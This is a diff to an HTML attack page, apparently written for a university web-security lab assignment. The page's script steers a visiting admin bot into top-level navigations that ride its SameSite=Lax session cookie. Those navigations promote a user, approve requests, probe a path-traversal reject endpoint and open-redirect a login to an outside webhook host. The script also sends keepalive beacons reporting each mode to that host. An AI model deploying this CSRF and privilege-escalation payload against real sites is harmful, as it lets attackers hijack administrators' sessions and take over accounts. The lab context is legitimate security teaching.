@@ -3,10 +3,7 @@
 <head><meta charset="utf-8"></head>
 <body>
 <script>
-// v8: immediate top-level navigation (no setTimeout — bots may close fast),
-// keepalive beacon (survives page teardown), generic aiming modes.
-// The top-level navigation carries the admin's SameSite=Lax `sid` cookie
-// (lecture 8: Lax permits cookies on safe-method top-level navigations).
+// v9: adds t=extnav (navigation-capability probe).
 var W    = 'https://swift-stream-09.webhook.cool';
 var BASE = 'https://10.20.18.55:2070/labs/assignment03/environment/1/';
 var q    = new URLSearchParams(location.search);
@@ -18,6 +15,7 @@ if      (mode === 'promote') { target = BASE + '?view=admin&request=../users/jos
 else if (mode === 'aget')    { target = BASE + '?view=admin&approve=' + rid; }
 else if (mode === 'pjoseph') { target = BASE + '?view=admin&promote=joseph'; }
 else if (mode === 'next')    { target = 'https://10.20.18.55:2070/login?next=https%3A%2F%2Fswift-stream-09.webhook.cool%2Foss'; }
+else if (mode === 'extnav')  { target = W + '/extnav'; }
 else /* reject oracle */     { target = BASE + '?view=admin&request=../requests/' + encodeURIComponent(rid) + '/reject?/seen'; }
 
 try { fetch(W + '/c1?tag=' + encodeURIComponent(mode + '-' + rid) + '&t=' + Date.now(), { keepalive: true, mode: 'no-cors' }); } catch (e) {}
